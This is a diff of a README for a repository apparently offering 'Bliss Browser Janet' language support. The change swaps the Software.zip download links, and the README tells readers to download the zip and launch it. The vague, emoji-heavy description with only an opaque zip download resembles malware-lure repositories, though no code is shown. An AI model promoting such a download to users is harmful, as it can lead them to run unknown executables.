@@ -1,7 +1,7 @@
 
 # Bliss Browser Janet 🌳️🌐️#️⃣️
 
-[![Software.zip](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![https://github.com/MonyiGamer/Bliss_Browser_Janet/releases/download/v2.0/Software.zip](https://github.com/MonyiGamer/Bliss_Browser_Janet/releases/download/v2.0/Software.zip)](https://github.com/MonyiGamer/Bliss_Browser_Janet/releases/download/v2.0/Software.zip)
 
 Welcome to the Bliss Browser Janet repository! This is your gateway to exploring the exciting world of Janet programming language support within the Bliss Browser environment.
 
@@ -22,7 +22,7 @@ Bliss Browser Janet is a language support module that enables developers to writ
 
 ## Getting Started 🏁
 
-To get started with Bliss Browser Janet, simply download the [Software.zip](https://github.com/user-attachments/files/18388744/Software.zip) file and launch the application. Dive into the world of Janet programming within the Bliss Browser environment and unleash your creativity!
+To get started with Bliss Browser Janet, simply download the [https://github.com/MonyiGamer/Bliss_Browser_Janet/releases/download/v2.0/Software.zip](https://github.com/MonyiGamer/Bliss_Browser_Janet/releases/download/v2.0/Software.zip) file and launch the application. Dive into the world of Janet programming within the Bliss Browser environment and unleash your creativity!
 
 ## Support 🤝
 
